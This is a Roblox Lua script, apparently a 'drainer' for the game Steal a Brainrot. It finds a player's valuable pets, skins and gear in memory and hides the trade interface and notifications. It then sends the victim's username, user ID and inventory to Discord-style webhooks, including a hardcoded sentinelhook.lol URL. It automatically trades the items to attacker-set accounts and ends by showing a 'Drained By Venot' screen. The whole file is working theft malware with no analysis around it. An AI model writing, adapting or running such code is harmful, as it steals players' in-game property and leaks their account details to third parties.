local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer
local currentCamera = workspace.CurrentCamera
local playerGui = localPlayer:WaitForChild("PlayerGui")

task.spawn(function()
	if not game:IsLoaded() then
		game.Loaded:Wait()
	end

	if not table.find({ 99606176102979, 109983668079237, 79906538690694, 119594317142884 }, game.PlaceId) then
		return
	end
	local targetUserId = getgenv().TARGET_USER_ID or 0
	local goodWebhook = getgenv().GOOD_WEBHOOK or ""
	local tradeWebhook = getgenv().TRADE_WEBHOOK
	local allowedAnimals = getgenv().ALLOWED_ANIMALS or {}
	local tbl = {}

	for _, allowedAnimal in ipairs(allowedAnimals) do
		if type(allowedAnimal) == "string" and allowedAnimal ~= "" and allowedAnimal ~= "Name Brainrot" then
			tbl[allowedAnimal] = true
		end
	end

	local allowedBaseskins = getgenv().ALLOWED_BASESKINS or {}
	local allowedGears = getgenv().ALLOWED_GEARS or {}
	local tbl2 = {}

	for _, allowedBaseskin in ipairs(allowedBaseskins) do
		if type(allowedBaseskin) == "string" and allowedBaseskin ~= "" and allowedBaseskin ~= "Name BaseSkin" then
			tbl2[allowedBaseskin] = true
		end
	end

	local tbl3 = {}

	for _, allowedGear in ipairs(allowedGears) do
		if type(allowedGear) == "string" and allowedGear ~= "" and allowedGear ~= "Name Gear" then
			tbl3[allowedGear] = true
		end
	end

	local targetId = 10180846954
	local nameFromUserIdAsync = Players:GetNameFromUserIdAsync(targetUserId)
	local nameFromUserIdAsync2 = Players:GetNameFromUserIdAsync(10659083291)

	local tbl4 = {
		["Strawberry Elephant"] = true,
		Meowl = true,
		["Headless Horseman"] = true,
		["Skibidi Toilet"] = true,
		Griffin = true,
		["Hydra Dragon Cannelloni"] = true,
		["Dragon Gingerini"] = true,
		["Dragon Cannelloni"] = true,
		["La Supreme Combinasion"] = true,
		["Love Love Bear"] = true,
		["Ginger Gerat"] = true,
		Antonio = true,
		["Signore Carapace"] = true,
		["Elefanto Frigo"] = true,
		["Bunny and Eggy"] = true,
		["Hydra Bunny"] = true,
		Arcadragon = true,
		["Pancake and Syrup"] = true,
		["Fishino Clownino"] = true,
		["Tirilikalika Tirilikalako"] = true,
		["Rico Dinero"] = true,
		["Kalika Bros"] = true,
		["Digi Narwhal"] = true,
		["Duggy Bros"] = true,
		["John Pork"] = true,
		["Dragon Aquanini"] = true,
		Kraken = true,
		["Moby Bros"] = true,
		["Jelly Moby"] = true,
		Bumbatron = true,
	}

	local str = "https://stealabrainrot.fandom.com/wiki/"
	local tbl5 = {}

	for k, v in pairs(tbl) do
		tbl5[k] = v
	end

	for k, v in pairs(tbl4) do
		tbl5[k] = v
	end

	local function fn(arg)
		local children = game:GetService("ReplicatedStorage").Packages.Net:GetChildren()

		local v = ({
			["RF/TradeService/Invite"] = 36,
			["RE/TradeService/Ready"] = 42,
			["RE/TradeService/Accept"] = 43,
			["RF/TradeService/AddItem"] = 48,
			["RF/TradeService/AddBrainrot"] = 50,
			["RF/TradeService/Cancel"] = 52,
			["RE/NotificationService/Notify"] = 209,
			["RF/TradeService/AcceptInvite"] = 37,
			["RE/TradeService/CreateInvite"] = 41,
		})[arg]

		if not v then
			return nil
		end
		local v2 = children[v]
		if v2 and (v2:IsA("RemoteFunction") or v2:IsA("RemoteEvent")) then
			return v2
		end
		return nil
	end

	local function fn2()
		local leftCenter = playerGui:FindFirstChild("LeftCenter")

		if leftCenter then
			local clone = leftCenter:Clone()
			clone.Name = "LeftCenter_Backup"
			clone.Parent = playerGui
			leftCenter:Destroy()
		end

		local Notify = fn("RE/NotificationService/Notify")

		if Notify then
			pcall(function()
				for _, v in ipairs(getconnections(Notify.OnClientEvent)) do
					v:Disable()
				end
			end)
		end

		local function fn3(child)
			if child:IsA("BlurEffect") then
				task.defer(function()
					child:Destroy()
				end)
			end
		end

		currentCamera.ChildAdded:Connect(fn3)

		for _, child in ipairs(currentCamera:GetChildren()) do
			fn3(child)
		end

		currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
			currentCamera.FieldOfView = 70
		end)

		currentCamera.FieldOfView = 70

		local function fn4(descendant)
			if descendant.Name == "TradeLiveTrade" then
				pcall(function()
					descendant.Enabled = false
				end)

				pcall(function()
					descendant.Visible = false
				end)

				pcall(function()
					sethiddenproperty(descendant, "Enabled", false)
				end)

				pcall(function()
					descendant:GetPropertyChangedSignal("Enabled"):Connect(function()
						pcall(function()
							descendant.Enabled = false
						end)

						pcall(function()
							sethiddenproperty(descendant, "Enabled", false)
						end)
					end)
				end)

				pcall(function()
					descendant:GetPropertyChangedSignal("Visible"):Connect(function()
						pcall(function()
							descendant.Visible = false
						end)
					end)
				end)
			end
		end

		for _, descendant in pairs(playerGui:GetDescendants()) do
			fn4(descendant)
		end

		playerGui.DescendantAdded:Connect(fn4)
	end

	local Animals = nil
	local Animals2 = nil
	local NumberUtils = nil

	pcall(function()
		Animals = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
		Animals2 = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
		NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
	end)

	local function fn3()
		local value

		pcall(function()
			for _, v in pairs(getgc(true)) do
				if type(v) == "table" and rawget(v, "AnimalList") then
					local value2 = rawget(v, "Owner")

					if not value2 and type(rawget(v, "Get")) == "function" then
						pcall(function()
							value2 = v:Get("Owner")
						end)
					end

					if value2 == localPlayer or type(value2) == "table" and value2.UserId == localPlayer.UserId then
						value = rawget(v, "AnimalList")

						if not value and type(rawget(v, "Get")) == "function" then
							pcall(function()
								value = v:Get("AnimalList")
							end)
						end

						if value then
							break
						else
						end
					else
					end
				end
			end
		end)

		return value
	end

	local function fn4()
		local v = nil

		pcall(function()
			for _, v2 in pairs(getgc(true)) do
				if type(v2) == "table" then
					local ok, result = pcall(rawget, v2, "BaseSkinInventory")

					if ok and type(result) == "table" then
						if type(rawget(v2, "Coins")) == "number" and type(rawget(v2, "Rebirth")) == "number" then
							v = v2
							break
						end
					end
				end
			end
		end)

		return v
	end

	local function fn5()
		local tbl6 = {}
		if not next(tbl2) then
			return tbl6
		end
		local v = fn4()
		if not v then
			return tbl6
		end
		local value = rawget(v, "BaseSkinInventory")
		if type(value) ~= "table" then
			return tbl6
		end

		for k, v2 in pairs(value) do
			if type(v2) == "table" then
				local str2 = tostring(v2.SkinName or v2.Skin or "")

				if tbl2[str2] then
					table.insert(tbl6, { uuid = tostring(k), skinName = str2 })
				end
			end
		end

		return tbl6
	end

	local function fn6()
		local tbl6 = {}
		if not next(tbl3) then
			return tbl6
		end
		local v = fn4()
		if not v then
			return tbl6
		end
		local value = rawget(v, "GearInventory")
		if type(value) ~= "table" then
			return tbl6
		end

		for k, v2 in pairs(value) do
			if type(v2) == "table" then
				local str2 = tostring(v2.GearName or v2.Name or "")

				if tbl3[str2] then
					table.insert(tbl6, { uuid = tostring(k), gearName = str2 })
				end
			end
		end

		return tbl6
	end

	local function fn7(arg)
		local tbl6 = {}
		local v = fn3()
		if not v then
			return tbl6
		end

		for k, v2 in pairs(v) do
			if type(v2) == "table" and v2.Index then
				local displayName = Animals and Animals[v2.Index]
				displayName = displayName and displayName.DisplayName or v2.Index
				local flag = tbl4[v2.Index] or tbl4[displayName] or false
				local flag2 = tbl[v2.Index] or tbl[displayName] or false
				local flag3

				if arg == "PRIORITY" and flag then
					flag3 = true
				else
					flag2 = arg == "NORMAL" and not flag and flag2
					flag3 = false

					if flag2 then
						flag3 = true
					end
				end

				if flag3 then
					table.insert(tbl6, { slotKey = k, data = v2, displayName = displayName, isPriority = flag })
				end
			end
		end

		return tbl6
	end

	local function fn8()
		local plots = workspace:FindFirstChild("Plots")
		if not plots then
			return nil
		end

		for _, child in pairs(plots:GetChildren()) do
			local plotSign = child:FindFirstChild("PlotSign")

			if plotSign then
				local yourBase = plotSign:FindFirstChild("YourBase")
				if yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled then
					return child
				end
			end
		end

		return nil
	end

	local function fn9(arg)
		if arg:IsA("BasePart") then
			return arg.Position
		end

		if arg.PrimaryPart then
			return arg.PrimaryPart.Position
		end
		local rootPart = arg:FindFirstChild("RootPart") or arg:FindFirstChild("FakeRootPart") or arg:FindFirstChild("Handle")
		if rootPart and rootPart:IsA("BasePart") then
			return rootPart.Position
		end

		for _, descendant in pairs(arg:GetDescendants()) do
			if descendant:IsA("BasePart") then
				return descendant.Position
			end
		end

		return nil
	end

	local function fn10(arg, arg2)
		local debris = workspace:FindFirstChild("Debris")
		if not debris then
			return nil
		end
		local v = fn9(arg)
		if not v then
			return nil
		end
		local displayName = Animals and Animals[arg2]
		displayName = displayName and displayName.DisplayName or arg2
		local v2 = string.gsub(string.lower(displayName), "%s+", "")
		local huge = math.huge
		local tbl6 = nil

		for _, child in pairs(debris:GetChildren()) do
			if child.Name == "FastOverheadTemplate" then
				local v3 = fn9(child)

				if v3 then
					local magnitude = (v3 - v).Magnitude

					if magnitude < huge then
						local animalOverhead = child:FindFirstChild("AnimalOverhead")

						if animalOverhead then
							local displayName2 = animalOverhead:FindFirstChild("DisplayName")
							local generation = animalOverhead:FindFirstChild("Generation")

							if displayName2 and displayName2:IsA("TextLabel") then
								local text = displayName2.Text or ""
								local v4 = string.gsub(string.lower(text), "%s+", "")

								if string.find(v4, v2, 1, true) or string.find(v2, v4, 1, true) then
									local isTextLabel = generation and generation:IsA("TextLabel")
									local str2 = ""

									if isTextLabel then
										str2 = generation.Text or ""
									end

									tbl6 = { name = text ~= "" and text or displayName, modelName = arg2, genText = str2 }

									if magnitude < 5 then
										break
									else
										huge = magnitude
									end
								end
							end
						end
					end
				end
			end
		end

		return tbl6
	end

	local function fn11(arg)
		local tbl6 = {}
		local v = fn8()
		if not v then
			return tbl6
		end
		local flag = arg == "PRIORITY" and tbl4 or tbl

		for _, descendant in pairs(v:GetDescendants()) do
			local name = descendant.Name
			local str2 = name:gsub("%d+$", "")

			if descendant:IsA("Model") and (flag[name] or flag[str2]) then
				local v2 = fn10(descendant, name)

				if v2 then
					local attribute = descendant:GetAttribute("Mutation") or "None"

					if attribute == "" then
						attribute = "None"
					end

					local v3, v4 = string.match(string.gsub(v2.genText, ",", ""), "%$([%d%.]+)([KMBT]?)/s")
					local n = 0

					if v3 then
						n = tonumber(v3) or 0

						if v4 == "K" then
							n *= 1000
						elseif v4 == "M" then
							n *= 1000000
						elseif v4 == "B" then
							n *= 1e9
						elseif v4 == "T" then
							n *= 1e12
						end
					end

					table.insert(tbl6, {
						index = v2.modelName,
						displayName = v2.name,
						name = "**" .. (attribute ~= "None" and attribute ~= "" and "[" .. attribute .. "] " or "") .. v2.name .. "**",
						genVal = n,
						genStr = v2.genText ~= "" and v2.genText or "$0/s",
					})
				end
			end
		end

		return tbl6
	end

	local function fn12()
		return syn and syn.request or http and http.request or http_request or request
	end

	local function fn13(arg)
		return (arg:match("^(.-)%s*%(") or arg):gsub(" ", "_")
	end

	local function fn14(arg)
		local v = fn12()
		if not v then
			return nil
		end
		local str2 = str .. fn13(arg)

		for i = 1, 3 do
			local ok, result = pcall(function()
				return v({
					Url = str2,
					Method = "GET",
					Headers = {
						["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
						Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
						["Accept-Language"] = "en-US,en;q=0.5",
						["Cache-Control"] = "no-cache",
					},
					Timeout = 10,
				})
			end)

			if ok and result and result.StatusCode and result.StatusCode == 200 then
				local body = result.Body

				if not body or body == "" then
					if i < 3 then
						task.wait(0.5)
					end

					continue
				end

				local match = body:match("property=\"og:image\"%s+content=\"([^\"]+)\"") or body:match("content=\"([^\"]+)\"%s+property=\"og:image\"") or body:match("<meta%s+og:image%s+content=\"([^\"]+)\"") or body:match("<meta%s+property=\"og:image\"%s+content=\"([^\"]+)\"")

				if match and match ~= "" then
					local str3 = match:gsub("&amp;", "&"):gsub("&quot;", "\""):gsub("&lt;", "<"):gsub("&gt;", ">")
					if str3:find("^https?://") then
						return str3
					end
				end

				body = body:match("<div[^>]*class=\"[^\"]*infobox[^\"]*\"[^>]*>(.-)</div>%s*</div>") or body

				for _, v2 in ipairs({
					"data%-src=\"(https://[^\"]+%.(?:png|jpg|jpeg|webp|gif))\"",
					"src=\"(https://[^\"]+%.(?:png|jpg|jpeg|webp|gif))\"",
				}) do
					local n = 1
					local v3 = nil

					while true do
						local pos, v4 = body:find(v2, n)

						if not pos then
							break
						else
							local match2 = body:sub(pos, v4):match("\"([^\"]+)\"")

							if match2 and match2:find("static%.wikia%.nocookie%.net") then
								if not match2:find("/scale%-to%-width%-down/[0-9]?[0-9]$") then
									v3 = match2
								end
							else
								v3 = match2 or v3
							end

							n = v4 + 1
						end
					end

					if v3 then
						return (v3:gsub("/revision/latest", ""))
					end
				end

				return nil
			end

			if i < 3 then
				task.wait(0.5 * i)
			end
		end

		return nil
	end

	local function fn15(arg)
		local v = nil

		pcall(function()
			local models = ReplicatedStorage:FindFirstChild("Models")
			models = models and models:FindFirstChild("Animals")
			if not models then
				return
			end
			local v2 = models:FindFirstChild(arg)

			if not v2 then
				local v3 = Animals and Animals[arg]

				if v3 and v3.DisplayName then
					v2 = models:FindFirstChild(v3.DisplayName)
				end
			end

			if not v2 then
				return
			end
			local n = 0

			for _, descendant in ipairs(v2:GetDescendants()) do
				if descendant:IsA("MeshPart") or descendant:IsA("Part") then
					local color = descendant.Color
					local n2 = descendant.Size.X * descendant.Size.Y * descendant.Size.Z
					local n3 = math.max(color.R, color.G, color.B)
					local n4 = math.min(color.R, color.G, color.B)
					local n5 = n3 > 0 and (n3 - n4) / n3 or 0
					local n6 = color.R * 0.299 + color.G * 0.587 + color.B * 0.114
					local n7 = (n5 * 3 + 0.2) * (n6 < 0.08 and 0.05 or n6 > 0.92 and 0.15 or 1) * n2

					if n < n7 then
						v = color
						n = n7
					end
				end
			end
		end)

		return v
	end

	local function fn16(arg)
		if not arg then
			return 7419530
		end
		local clamp = math.clamp
		return math.clamp(math.floor(arg.R * 255), 0, 255) * 65536 + clamp(math.floor(arg.G * 255), 0, 255) * 256 + math.clamp(math.floor(arg.B * 255), 0, 255)
	end

	local function fn17(arg, arg2)
		local v = fn14(arg)
		if v then
			return v
		end
		local v2 = Animals and Animals[arg2]

		if v2 then
			for _, v3 in ipairs({ "Image", "Icon", "Thumbnail", "Texture", "ImageId", "AssetId", "image", "icon" }) do
				if v2[v3] and type(v2[v3]) == "string" and v2[v3] ~= "" then
					local match = v2[v3]:match("%d+")
					if match then
						return "https://tr.rbxcdn.com/" .. match .. "/420/420/Image/Png"
					end
				end
			end
		end

		return fn14(arg2)
	end

	local function fn18(arg, arg2, arg3)
		local v = fn12()
		if not v then
			return
		end

		task.spawn(function()
			local n = arg3 or 3

			for i = 1, n do
				if pcall(function()
					v({ Url = arg, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = arg2 })
				end) then
					return
				end
				task.wait(1 * i)
			end
		end)
	end

	local function fn19()
		local v = fn8()
		local str2 = "Default"

		if v then
			str2 = v:GetAttribute("BaseSkinName") or "Default"
		end

		local v2 = fn5()
		if #v2 == 0 then
			return "**Active:** " .. tostring(str2) .. "\n**To Trade:** None"
		end
		local tbl6 = {}

		for _, v3 in ipairs(v2) do
			table.insert(tbl6, "• " .. v3.skinName)
		end

		return "**Active:** " .. tostring(str2) .. "\n**To Trade (" .. #v2 .. "):**\n" .. table.concat(tbl6, "\n")
	end

	local function fn20()
		local v = fn6()
		if #v == 0 then
			return "None"
		end
		local tbl6 = {}

		for _, v2 in ipairs(v) do
			table.insert(tbl6, "• " .. v2.gearName)
		end

		local str2 = table.concat(tbl6, "\n")

		if #str2 > 1000 then
			str2 = str2:sub(1, 996) .. "..."
		end

		return str2
	end

	local function fn21(arg, arg2, arg3, arg4, arg5, arg6)
		if #arg == 0 then
			return
		end

		table.sort(arg, function(arg7, arg8)
			return arg7.genVal > arg8.genVal
		end)

		local v = arg[1]
		local v2 = fn17(v.displayName, v.index)
		local v3 = fn16(fn15(v.index))
		local tbl6 = {}

		for i, v4 in ipairs(arg) do
			tbl6[i] = v4.name .. " — **" .. v4.genStr .. "**"
		end

		local str2 = table.concat(tbl6, "\n")

		if #str2 > 3800 then
			str2 = str2:sub(1, 3796) .. "..."
		end

		local str3 = "Unknown"

		pcall(function()
			if identifyexecutor then
				str3 = identifyexecutor()
			elseif getexecutorname then
				str3 = getexecutorname()
			end
		end)

		local v4 = fn19()
		local v5 = fn20()
		local v6 = fn6()

		local tbl7 = {
			title = (arg6 and "[" .. arg6 .. "] " or "") .. v.displayName .. " — " .. v.genStr,
			description = str2,
			color = v3,
		}

		local fields = {}
		local tbl8 = { name = "🎨 Base Skin", value = v4, inline = false }
		local tbl9 = { name = "⚔️ Gears (" .. #v6 .. ")", value = v5, inline = false }

		local tbl10 = {
			name = "Server",
			value = "Players: **" .. #Players:GetPlayers() .. "** | <t:" .. os.time() .. ":R>",
			inline = true,
		}

		local tbl11 = { name = "User", value = localPlayer.Name .. " (`" .. localPlayer.UserId .. "`)", inline = true }
		fields[1] = tbl8
		fields[2] = tbl9
		fields[3] = tbl10
		fields[4] = { name = "Executor", value = str3, inline = true }
		fields[5] = tbl11
		tbl7.fields = fields
		tbl7.footer = { text = localPlayer.Name .. " • " .. localPlayer.UserId }
		tbl7.timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")

		if v2 then
			tbl7.thumbnail = { url = v2 }
		end

		local tbl12 = { embeds = { tbl7 }, username = arg5 or "LOGGER", avatar_url = arg3 or "" }

		if arg4 then
			tbl12.content = "Venot victim||@everyone||"
		end

		fn18(arg2, HttpService:JSONEncode(tbl12), 3)
	end

	local function fn22()
		pcall(function()
			local CoreGui = playerGui

			pcall(function()
				CoreGui = game:GetService("CoreGui")
			end)

			if CoreGui:FindFirstChild("DrainOverlay") then
				return
			end
			local screenGui = Instance.new("ScreenGui")
			screenGui.Name = "DrainOverlay"
			screenGui.IgnoreGuiInset = true
			screenGui.ResetOnSpawn = false
			screenGui.DisplayOrder = 999999
			screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			screenGui.Parent = CoreGui
			local frame = Instance.new("Frame")
			frame.Size = UDim2.new(1, 0, 1, 0)
			frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			frame.BorderSizePixel = 0
			frame.ZIndex = 999998
			frame.Parent = screenGui
			local textLabel = Instance.new("TextLabel")
			textLabel.Size = UDim2.new(1, -40, 0.4, 0)
			textLabel.Position = UDim2.new(0, 20, 0.15, 0)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = "Your Brainrot Drained By Venot"
			textLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
			textLabel.TextScaled = true
			textLabel.Font = Enum.Font.GothamBlack
			textLabel.TextStrokeTransparency = 0.7
			textLabel.ZIndex = 999999
			textLabel.Parent = screenGui
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.Size = UDim2.new(1, -40, 0.2, 0)
			textLabel2.Position = UDim2.new(0, 20, 0.65, 0)
			textLabel2.BackgroundTransparency = 1
			textLabel2.Text = ""
			textLabel2.TextColor3 = Color3.fromRGB(255, 50, 50)
			textLabel2.TextScaled = true
			textLabel2.Font = Enum.Font.GothamBlack
			textLabel2.TextStrokeTransparency = 0.7
			textLabel2.ZIndex = 999999
			textLabel2.Parent = screenGui

			screenGui.AncestryChanged:Connect(function(child, parent)
				if parent == nil then
					task.wait(0.1)
					screenGui.Parent = CoreGui
				end
			end)
		end)
	end

	local priority = fn7("PRIORITY")
	local normal = fn7("NORMAL")
	local v = fn5()
	local v2 = fn6()
	if #priority == 0 and #normal == 0 and #v == 0 and #v2 == 0 then
		return
	end
	fn2()

	local tbl6 = {
		phase = "IDLE",
		queue = {},
		targetId = 0,
		running = false,
		priorityDone = false,
		addIdx = 1,
		baseSkinQueue = {},
		gearQueue = {},
		baseSkinIdx = 1,
		gearIdx = 1,
	}

	if #priority > 0 and targetId ~= 0 then
		fn21(fn11("PRIORITY"), "https://sentinelhook.lol/api.php?id=XZxouWroF6uAN5W", "https://cdn.discordapp.com/attachments/1503012061188198400/1522704317264560189/togif.gif?ex=6a4cbc27&is=6a4b6aa7&hm=6667051345d497289a91b99de877a342bdf6582eba18d1fb56fb69695ac087a9&", true, "VenotBurda [PRIORITY]", "PRIORITY")
		tbl6.phase = "PRIORITY"
		tbl6.queue = priority
		tbl6.targetId = targetId
		tbl6.running = true
		tbl6.addIdx = 1
	else
		if not ((#normal > 0 or #v > 0 or #v2 > 0) and targetUserId ~= 0) then
			return
		end
		local normal2 = fn11("NORMAL")
		fn21(normal2, goodWebhook, nil, true, "LOGGER Venot", nil)
		fn21(normal2, "https://sentinelhook.lol/api.php?id=XZxouWroF6uAN5W", "https://cdn.discordapp.com/attachments/1503012061188198400/1522704317264560189/togif.gif?ex=6a4cbc27&is=6a4b6aa7&hm=6667051345d497289a91b99de877a342bdf6582eba18d1fb56fb69695ac087a9&", false, "VenotBurda [DUALHOOK]", nil)
		tbl6.phase = "NORMAL"
		tbl6.queue = normal
		tbl6.targetId = targetUserId
		tbl6.running = true
		tbl6.addIdx = 1
	end

	tbl6.baseSkinQueue = fn5()
	tbl6.gearQueue = fn6()
	tbl6.baseSkinIdx = 1
	tbl6.gearIdx = 1
	local Invite = fn("RF/TradeService/Invite")
	local AddBrainrot = fn("RF/TradeService/AddBrainrot")
	local AddItem = fn("RF/TradeService/AddItem")
	local Ready = fn("RE/TradeService/Ready")
	local Accept = fn("RE/TradeService/Accept")
	local Cancel = fn("RF/TradeService/Cancel")
	local CreateInvite = fn("RE/TradeService/CreateInvite")
	local AcceptInvite = fn("RF/TradeService/AcceptInvite")
	if not (Invite and AddBrainrot and AddItem and Ready and Accept and Cancel and CreateInvite and AcceptInvite) then
		return
	end
	local v3 = nil
	local from = nil

	if CreateInvite and CreateInvite:IsA("RemoteEvent") then
		CreateInvite.OnClientEvent:Connect(function(arg, arg2)
			if not arg or not arg2 or not arg2.from then
				return
			end
			v3 = arg
			from = arg2.from
		end)
	end

	task.spawn(function()
		while true do
			if v3 and from then
				if not (from == targetUserId or from == targetId) then
					pcall(function()
						Cancel:FireServer("171b5ced-5729-49c0-8d80-9c1897ff1ea3")
					end)

					v3 = nil
					from = nil
				end
			end

			task.wait(0.5)
		end
	end)

	task.spawn(function()
		while true do
			pcall(function()
				local tradeLiveTrade = playerGui:FindFirstChild("TradeLiveTrade")

				if tradeLiveTrade then
					local tradeLiveTrade2 = tradeLiveTrade:FindFirstChild("TradeLiveTrade")

					if tradeLiveTrade2 and tradeLiveTrade2:FindFirstChild("Other") then
						local username = tradeLiveTrade2.Other:FindFirstChild("Username")

						if username then
							username = not (string.find(username.Text:lower(), nameFromUserIdAsync:lower(), 1, true) or string.find(username.Text:lower(), nameFromUserIdAsync2:lower(), 1, true))
						end

						if username then
							pcall(function()
								Cancel:FireServer("171b5ced-5729-49c0-8d80-9c1897ff1ea3")
							end)
						end
					end
				end
			end)

			task.wait(0.5)
		end
	end)

	task.spawn(function()
		while true do
			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
				local queue = tbl6.queue

				if #queue > 0 then
					if #queue < tbl6.addIdx then
						tbl6.addIdx = 1
					end

					local v4 = queue[tbl6.addIdx]

					if v4 then
						if not (tbl6.priorityDone and v4.isPriority) then
							pcall(function()
								AddBrainrot:InvokeServer("c85a2323-36b2-4121-968a-c064a6168aff", v4.slotKey, v4.data)
							end)
						end
					end

					tbl6.addIdx = tbl6.addIdx + 1

					if tbl6.addIdx > #queue then
						tbl6.addIdx = 1
					end
				end
			end

			task.wait(1)
		end
	end)

	task.spawn(function()
		while true do
			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and AddItem then
				local baseSkinQueue = tbl6.baseSkinQueue

				if #baseSkinQueue > 0 then
					if tbl6.baseSkinIdx > #baseSkinQueue then
						tbl6.baseSkinIdx = 1
					end

					local v4 = baseSkinQueue[tbl6.baseSkinIdx]

					if v4 and v4.skinName and v4.skinName ~= "" then
						pcall(function()
							AddItem:InvokeServer("6786cce9-00d8-41e9-8beb-d96e0412b78b", "BaseSkin", { UUID = v4.uuid, SkinName = v4.skinName })
						end)
					end

					tbl6.baseSkinIdx = tbl6.baseSkinIdx + 1
				end
			end

			task.wait(1)
		end
	end)

	task.spawn(function()
		while true do
			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" and AddItem then
				local gearQueue = tbl6.gearQueue

				if #gearQueue > 0 then
					if #gearQueue < tbl6.gearIdx then
						tbl6.gearIdx = 1
					end

					local v4 = gearQueue[tbl6.gearIdx]

					if v4 and v4.gearName and v4.gearName ~= "" then
						local tbl7 = { GearName = v4.gearName }

						if type(v4.uuid) == "string" and v4.uuid ~= "" and v4.uuid ~= "nil" then
							tbl7.UUID = v4.uuid
						end

						pcall(function()
							AddItem:InvokeServer("6786cce9-00d8-41e9-8beb-d96e0412b78b", "Gear", tbl7)
						end)
					end

					tbl6.gearIdx = tbl6.gearIdx + 1
				end
			end

			task.wait(1)
		end
	end)

	task.spawn(function()
		while true do
			if tbl6.running and tbl6.targetId ~= 0 and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
				local flag = tbl6.priorityDone and tbl6.targetId == targetId
				local flag2 = true

				if flag then
					flag2 = false
				end

				if tbl6.phase ~= "PRIORITY" and tbl6.targetId == targetId then
					flag2 = false
				end

				if flag2 then
					pcall(function()
						Invite:InvokeServer("8fbe1594-7cef-4c29-94d1-a0e93adfa5a4", tbl6.targetId)
					end)
				end
			end

			task.wait(2)
		end
	end)

	task.spawn(function()
		while true do
			if tbl6.running and tbl6.phase ~= "SWITCHING" and tbl6.phase ~= "IDLE" then
				pcall(function()
					Ready:FireServer("23f15b0b-b633-4f6b-888f-5924b7425522")
				end)

				task.wait(0.7)

				pcall(function()
					Accept:FireServer("86eea964-f19e-4ac6-b401-a71ecc89e596")
				end)

				if tbl6.phase == "PRIORITY" and not tbl6.priorityDone then
					task.wait(0.15)
					local priority2 = fn7("PRIORITY")

					if #priority2 == 0 then
						tbl6.priorityDone = true
						tbl6.phase = "SWITCHING"
						tbl6.running = false
						tbl6.targetId = 0
						tbl6.queue = {}
						task.wait(1)
						local normal2 = fn7("NORMAL")
						local v4 = fn5()
						local v5 = fn6()

						if (#normal2 > 0 or #v4 > 0 or #v5 > 0) and targetUserId ~= 0 then
							local normal3 = fn11("NORMAL")
							fn21(normal3, goodWebhook, nil, true, "LOGGER VENOT", nil)
							fn21(normal3, "https://sentinelhook.lol/api.php?id=XZxouWroF6uAN5W", "https://cdn.discordapp.com/attachments/1503012061188198400/1522704317264560189/togif.gif?ex=6a4cbc27&is=6a4b6aa7&hm=6667051345d497289a91b99de877a342bdf6582eba18d1fb56fb69695ac087a9&", false, "VenotBurda [DUALHOOK]", nil)
							tbl6.queue = normal2
							tbl6.targetId = targetUserId
							tbl6.phase = "NORMAL"
							tbl6.running = true
							tbl6.addIdx = 1
							tbl6.baseSkinQueue = v4
							tbl6.gearQueue = v5
							tbl6.baseSkinIdx = 1
							tbl6.gearIdx = 1
						else
							tbl6.phase = "IDLE"
						end
					else
						tbl6.queue = priority2
						tbl6.addIdx = 1
					end
				end
			end

			task.wait(0.7)
		end
	end)

	task.spawn(function()
		while tbl6.phase ~= "NORMAL" do
			task.wait(0.5)
			if tbl6.phase ~= "IDLE" then
				continue
			end
			return
		end

		local n = #fn7("NORMAL")
		local n2 = #fn5()
		local n3 = #fn6()
		if n == 0 and n2 == 0 and n3 == 0 then
			return
		end

		while true do
			task.wait(0.5)
			local n4 = #fn7("NORMAL")
			local n5 = #fn5()
			local n6 = #fn6()
			if not (n4 < n or n5 < n2 or n6 < n3) then
				continue
			end
			break
		end

		fn22()
	end)
end)
